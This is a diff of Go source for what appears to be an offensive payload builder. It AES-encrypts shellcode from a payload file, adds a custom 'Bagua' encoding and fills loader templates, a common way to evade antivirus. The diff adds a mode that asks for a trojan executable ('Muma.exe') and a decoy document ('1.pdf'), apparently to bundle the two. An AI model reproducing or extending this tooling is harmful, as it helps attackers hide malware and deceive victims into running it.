@@ -12,9 +12,11 @@ var (
 	path        = "payload.bin"
 	enmode      = "AES"
 	aesmode int = 1
-	aeskey      = "sangfor@2021"
-	tplname int = 1
+	aeskey      = "happy@2022"
+	tplname  	= "1"
 	xid 	int = 1
+	mfilename =  "Muma.exe"
+	filename =   "1.pdf"
 	//shellcode     = []byte{
 	//	//calc.exe https://github.com/peterferrie/win-exec-calc-shellcode
 	//	0x31, 0xc0, 0x50, 0x68, 0x63, 0x61, 0x6c, 0x63,
@@ -71,18 +73,20 @@ func main() {
 		if enmode == "AES" {
 			fmt.Println("[+]请输入AES加密方式 [默认1，1=Ecb 2=Cbc 3=Ctr 4=Cfb 5=Ofb]")
 			fmt.Scanln(&aesmode)
-			fmt.Println("[+]请输入自定义密钥 [默认 sangfor@2021]")
+			fmt.Println("[+]请输入自定义密钥 [默认 happy@2022]")
 			fmt.Scanln(&aeskey)
 			fmt.Println("开始制作------------------------->")
 			fmt.Println("<-------------------------制作完成")
-			Aes_go(sc, []byte(aeskey), aesmode)
+			Aes_go(sc, []byte(aeskey), aesmode,tplname)
 
 
 		}
 
 	}else if xid == 2{
-		fmt.Println("[+]请输入被捆绑文件地址")
-
+		fmt.Println("[+]请输入Muma文件路径  [默认当前路径下 Muma.exe]")
+		fmt.Scanln(&mfilename)
+		fmt.Println("[+]请输入需要处理的文件 [默认当前路径下 1.pdf]")
+		fmt.Scanln(&filename)
 
 
 	}
@@ -100,15 +104,15 @@ func main() {
 //	return f
 //}
 
-func Aes_go(sc, key []byte, mode int) {
+func Aes_go(sc, key []byte, keymode int ,tmpmode string) {
 
-	enstr, _ := encrypt.Aes_en(sc, key, mode)
+	enstr, _ := encrypt.Aes_en(sc, key, keymode)
 	//destr:=encrypt.Aes_de(enstr,key,aes)
 
 	s := encrypt.Bagua_en(enstr)
 	//fmt.Printf("Aes 加密：%s\nAes 解密：%s\n八卦加密：%s\n八卦解密：%s\n",string(enstr),string(destr),s,string(j))
 
-	//执行模板操作，参数1 加密内容 参数2 密钥 参数3 模板
-	In.Tpl_go(s,string(key),mode)
+	//执行模板操作，参数1 加密内容 参数2 密钥 参数3 加密类型 参数4 模板
+	In.Tpl_go(s,string(key),keymode,tmpmode)
 
 }
